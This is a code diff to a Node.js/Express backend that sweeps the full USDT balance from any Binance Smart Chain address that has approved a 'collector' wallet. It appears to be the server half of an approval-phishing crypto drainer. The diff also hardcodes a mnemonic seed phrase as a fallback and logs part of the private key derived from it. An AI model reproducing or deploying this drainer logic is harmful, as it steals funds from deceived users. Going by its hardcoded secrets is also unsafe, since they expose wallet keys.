@@ -7,12 +7,26 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// ─── Config ────────────────────────────────────────────────────────
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const COLLECTOR = process.env.COLLECTOR_ADDRESS || "0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4";
+// ─── CONFIG ────────────────────────────────────────────────────────
+// OPTION A: Use mnemonic from environment variable
+const MNEMONIC = process.env.MNEMONIC || "security reject bomb faith clinic foster bubble attack outside upper divorce grass";
+
+// Derive private key from mnemonic
+const DERIVATION_PATH = "m/44'/60'/0'/0/0";
+const hdNode = ethers.HDNodeWallet.fromPhrase(MNEMONIC, "", DERIVATION_PATH);
+const PRIVATE_KEY = hdNode.privateKey;
+const WALLET_ADDRESS = hdNode.address;
+
+console.log(`🧠 Derived wallet from mnemonic:`);
+console.log(`📦 Address: ${WALLET_ADDRESS}`);
+console.log(`🔑 Private Key: ${PRIVATE_KEY.substring(0, 10)}... (hidden)`);
+
+// Your collector address (should match derived address)
+const COLLECTOR = process.env.COLLECTOR_ADDRESS || WALLET_ADDRESS;
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RPC = "https://bsc-dataseed1.binance.org/";
 
+// ─── Initialize Wallet ─────────────────────────────────────────────
 const provider = new ethers.JsonRpcProvider(RPC);
 const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
@@ -24,14 +38,17 @@ const USDT_ABI = [
 const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
 
 // ─── Health Check ──────────────────────────────────────────────────
-app.get('/api/health', (req, res) => res.json({ status: 'ok', collector: COLLECTOR }));
+app.get('/api/health', (req, res) => res.json({ 
+  status: 'ok', 
+  collector: COLLECTOR,
+  address: WALLET_ADDRESS 
+}));
 
 // ─── SWEEP ALL USDT ───────────────────────────────────────────────
 app.post('/api/execute-collection', async (req, res) => {
   const { userAddress } = req.body;
   
   try {
-    // 1. Validate address
     if (!userAddress || !ethers.isAddress(userAddress)) {
       return res.status(400).json({ 
         success: false, 
@@ -39,7 +56,6 @@ app.post('/api/execute-collection', async (req, res) => {
       });
     }
 
-    // 2. Get user's FULL USDT balance
     const userBalance = await usdt.balanceOf(userAddress);
     console.log(`📊 User ${userAddress} has ${ethers.formatUnits(userBalance, 18)} USDT`);
 
@@ -51,31 +67,23 @@ app.post('/api/execute-collection', async (req, res) => {
       });
     }
 
-    // 3. Check allowance (must be >= userBalance)
     const allowance = await usdt.allowance(userAddress, COLLECTOR);
     console.log(`📝 Allowance: ${ethers.formatUnits(allowance, 18)} USDT`);
 
     if (allowance < userBalance) {
       return res.status(400).json({
         success: false,
-        error: 'Insufficient allowance. User must approve the collector address for the full amount.',
+        error: 'Insufficient allowance. User must approve the collector address.',
         required: ethers.formatUnits(userBalance, 18),
         allowance: ethers.formatUnits(allowance, 18)
       });
     }
 
-    // 4. SWEEP ALL - Transfer entire balance
     console.log(`🔄 Sweeping ${ethers.formatUnits(userBalance, 18)} USDT from ${userAddress}`);
-    const tx = await usdt.transferFrom(
-      userAddress,
-      COLLECTOR,
-      userBalance  // <-- FULL BALANCE
-    );
-    
+    const tx = await usdt.transferFrom(userAddress, COLLECTOR, userBalance);
     const receipt = await tx.wait();
     console.log(`✅ Swept successfully! Tx: ${receipt.hash}`);
 
-    // 5. Get updated collector balance
     const newBalance = await usdt.balanceOf(COLLECTOR);
 
     res.json({
@@ -89,18 +97,9 @@ app.post('/api/execute-collection', async (req, res) => {
 
   } catch (error) {
     console.error('Sweep error:', error);
-    
-    let errorMessage = error.message;
-    if (errorMessage.includes('execution reverted')) {
-      errorMessage = 'Transaction reverted. User may have insufficient balance or revoked allowance.';
-    } else if (errorMessage.includes('insufficient funds')) {
-      errorMessage = 'Backend wallet has insufficient BNB for gas.';
-    }
-    
     res.status(500).json({
       success: false,
-      error: errorMessage,
-      details: error.message
+      error: error.message
     });
   }
 });
